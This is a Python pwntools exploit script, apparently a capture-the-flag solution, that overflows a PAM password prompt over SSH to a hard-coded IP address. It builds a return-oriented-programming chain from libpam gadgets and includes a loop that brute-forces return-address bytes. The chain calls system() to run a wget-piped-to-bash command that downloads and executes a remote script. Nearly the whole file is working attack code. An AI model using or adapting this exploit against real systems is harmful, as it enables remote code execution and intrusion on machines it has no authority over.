#!/usr/bin/env python
from pwn import *
import paramiko
from paramiko.ssh_exception import AuthenticationException, SSHException
from timeout_decorator import timeout, TimeoutError

context(arch='amd64', os='linux')

def rop(chain):
    class Handler(object):
        def __init__(self, probing):
            self.ctr = 0
            self.probing = probing

        def __call__(self, title, instructions, prompt_list):
            self.ctr += 1
            if self.ctr >= 2:
                assert False # 'ipossible'
            assert prompt_list[0][0] == u'Password: '
            payload = (
                'A' * 0x68 +
                self.probing
            )
            return (b64e(payload), )

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(("142.93.107.255", 22))
    ts = paramiko.Transport(sock)
    ts.start_client(timeout=10)
    handler = Handler(chain)
    try:
        ts.auth_interactive('factorycontrol', handler)
    except AuthenticationException:
        pass
    print(handler.ctr)
    sock.close()

libpam_base = 0x7ffff779aea6 - 0x2ea6
libpam = ELF('libpam.so.0.83.1')
libpam.address = libpam_base

jmp_rax                = libpam_base + 0x00000000000024a8 # jmp rax

pop_rdi                = libpam_base + 0x0000000000002bb6 # pop rdi ; ret
pop_rsi                = libpam_base + 0x00000000000027cc # pop rsi ; ret
pop_ebx                = libpam_base + 0x00000000000029af # pop rbx ; ret
mov_rax_rbx_pop_rbx    = libpam_base + 0x000000000000483e # mov rax, rbx ; pop rbx ; ret

push_rax_call_rsi      = libpam_base + 0x000000000000bee0 # push rax ; xchg bh, bh ; call qword ptr [rsi]

# write memory
mov_prbx_rax_pop_rbx   = libpam_base + 0x00000000000029ab # mov qword ptr [rbx + 0x78], rax ; pop rbx ; ret

add_rsp8               = libpam_base + 0x00000000000020cd # add rsp, 8 ; ret

call_rax               = libpam_base + 0x000000000000a7b3 # call rax

# bad gadgets
mov_rdx_prdx_8         = libpam_base + 0x0000000000002a76 # mov rdx, qword ptr [rdx + 8] ; call rax
mov_rcx_prax_call_prax = libpam_base + 0x0000000000006acd # mov rcx, qword ptr [rax + 8] ; call qword ptr [rax]
mov_prdx_rax           = libpam_base + 0x0000000000006834 # mov qword ptr [rdx], rax ; xor eax, eax ; add rsp, 8 ; ret

ptr_add_rsp8    = libpam.bss(0)
ptr_str_system  = libpam.bss(16)
ptr_str_command = libpam.bss(32)

set_rdi = lambda rdi: flat(pop_rdi, rdi)
set_rsi = lambda rsi: flat(pop_rsi, rsi)
save_rax = lambda: flat(write_mem(ptr_add_rsp8, add_rsp8), pop_rsi, ptr_add_rsp8, push_rax_call_rsi)
set_rax_rbx = lambda rax, rbx: flat(mov_rax_rbx_pop_rbx, rax, mov_rax_rbx_pop_rbx, rbx)
write_mem = lambda ptr, data: flat(set_rax_rbx(data, ptr - 0x78), mov_prbx_rax_pop_rbx, 0)

def write_str(ptr, data):
    r = ''
    data += '\0' * 8
    for i in range(0, len(data), 8):
        if i+8 >= len(data):
            break
        assert len(data[i:i+8]) == 8
        r += write_mem(ptr + i, data[i:i+8])
    return r


# rop(flat(set_rax_rbx(jmp_rax, 0), jmp_rax)) # stop gadgets

stop = flat(set_rax_rbx(jmp_rax, 0), jmp_rax)
rop(flat(
    write_str(ptr_str_system, 'system\0'),
    write_str(ptr_str_command, '/usr/bin/wget -qO- http://example.com/cb.sh | /bin/bash\0'),
    set_rdi(0), set_rsi(ptr_str_system), libpam.symbols['dlsym'],
    set_rdi(ptr_str_command), call_rax,
    stop,
))



exit()


@timeout(1.7)
def probe(probing):
    class Handler(object):
        def __init__(self, probing):
            self.ctr = 0
            self.probing = probing

        def __call__(self, title, instructions, prompt_list):
            self.ctr += 1
            #print(repr([title, instructions, prompt_list]))
            if self.ctr >= 2:
                return []
            assert prompt_list[0][0] == u'Password: '
            payload = (
                'A' * 0x68 +
                self.probing
            )
            return (b64e(payload), )

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(("142.93.107.255", 22))
    ts = paramiko.Transport(sock)
    ts.start_client(timeout=10)
    handler = Handler(probing)
    try:
        ts.auth_interactive('factorycontrol', handler)
    except AuthenticationException:
        pass
    print('%d - %s' % (handler.ctr, hexdump(probing)))
    sock.close()
    return handler.ctr

# probing the return address
good_bytes = [
    unhex('2b a6 bf ca ce cf d0 d1 d2 d3 d4 d5 d9 df e0 e2 e8 f1 f4 f7 fa ff'.replace(' ', '')),
    unhex('ae'),
    unhex('79'),
]
# return address is libpam + 0x2ea6
known = unhex('a6ae79f7ff7f0000') # 0x7fff7f79aea6
goods = []

for i in range(256):
    try:
        r = probe(known + p8(i))
        if r == 2:
            goods.append(known + p8(i))
    except TimeoutError:
        pass
    except SSHException:
        pass

print([ enhex(i) for i in goods ])
